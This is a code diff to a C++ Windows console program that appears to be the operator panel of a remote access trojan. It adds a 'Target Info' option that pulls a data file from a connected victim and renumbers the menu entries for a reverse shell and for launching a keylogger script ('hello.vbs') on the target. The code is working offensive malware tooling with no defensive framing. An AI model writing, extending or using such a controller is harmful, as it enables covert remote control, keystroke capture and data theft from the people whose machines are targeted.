@@ -1,4 +1,4 @@
-// cl /EHsc .\testconsole.cpp /link ws2_32.lib /OUT:testconsole.exe
+// cl /EHsc .\console.cpp /link ws2_32.lib /OUT:console.exe  
 #include <winsock2.h>
 #include <iostream>
 #include <ws2tcpip.h>
@@ -54,12 +54,27 @@ int main(int argc, char *argv[])
                 //system("pause");
                 break;
             }
-            
-            case '2':                                                                   //Rev shell
+
+            case '2':                                                                   //Get info
             {
                 if (targetconnected) 
                 {
-                    send_data(sock,"from_server.txt","2");
+                    cout<< receive_data(sock,"target_data.rat");
+                    system("pause");
+                } 
+                else
+                {
+                    cout << ">> Target not connected or socket invalid!!" << endl;
+                    system("pause");
+                }
+                break;
+            }
+
+            case '3':                                                                   //Rev shell
+            {
+                if (targetconnected) 
+                {
+                    send_data(sock,"from_server.txt","3");
                     cout << ">> Sent " << endl;
                 } 
                 else
@@ -73,11 +88,11 @@ int main(int argc, char *argv[])
                 break;
             }
             
-            case '3':                                                                   //Execute keylogger
+            case '4':                                                                   //Execute keylogger
             {
                 if (targetconnected)
                 {
-                    send_data(sock,"from_server.txt", "3hello.vbs");
+                    send_data(sock,"from_server.txt", "4hello.vbs");
                     cout << ">> Sent " << endl;
                 }
                 else cout << ">> Target not connected or socket invalid!!" << endl;
@@ -483,8 +498,9 @@ char Get_menu_option()
     else cout << "  [o]\n";
 
     cout << R"(
-                                    Rev Shell                               2
-                                    KeyStroke Injection                     3
+                                    Target Info                             2
+                                    Rev Shell                               3
+                                    KeyStroke Injection                     4
                                                                             )";            
                                     
     if(targetconnected)cout << R"(
